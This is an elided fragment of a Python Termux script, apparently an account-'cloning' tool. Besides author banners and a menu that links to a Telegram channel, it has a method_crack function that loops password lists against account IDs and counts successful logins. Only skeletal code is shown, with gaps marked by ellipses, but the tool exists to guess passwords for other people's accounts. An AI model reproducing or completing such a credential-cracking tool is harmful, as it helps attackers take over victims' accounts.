#--------------++CREATED     +Shamim Hassion++-----------------#
#--------------++FACEBOOK  + Shamim Hassion++----------------#
#--------------++ GITHUB        + Shamim Hassion+--------------------------#
...
║   
   _____ __                    _              __  __                _           
  / ___// /_  ____ _____ ___  (_)___ ___     / / / /___ ___________(_)___  ____ 
  \__ \/ __ \/ __ `/ __ `__ \/ / __ `__ \   / /_/ / __ `/ ___/ ___/ / __ \/ __ \
 ___/ / / / / /_/ / / / / / / / / / / / /  / __  / /_/ (__  |__  ) / /_/ / / / /
/____/_/ /_/\__,_/_/ /_/ /_/_/_/ /_/ /_/  /_/ /_/\__,_/____/____/_/\____/_/ /_/ 
                                                                                
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝ 
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;45m      [ TOOLS CREATED BY :Shamim Hassion ]     \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
def TARA_LOVE():
    ...
    if option in ['01','1']:
        BD_CLONING()
    if option in ['02','2']:
    	os.system('xdg-open https://t.me/termux_hacker_shamim');time.sleep(1)
    if option in ['03','3']:
    	os.system('xdg-open https://t.me/termux_hacker_shamim+');time.sleep(1)
    else:
...
def method_crack(ids,passlist):
    ...
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[Shamim Hassion] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
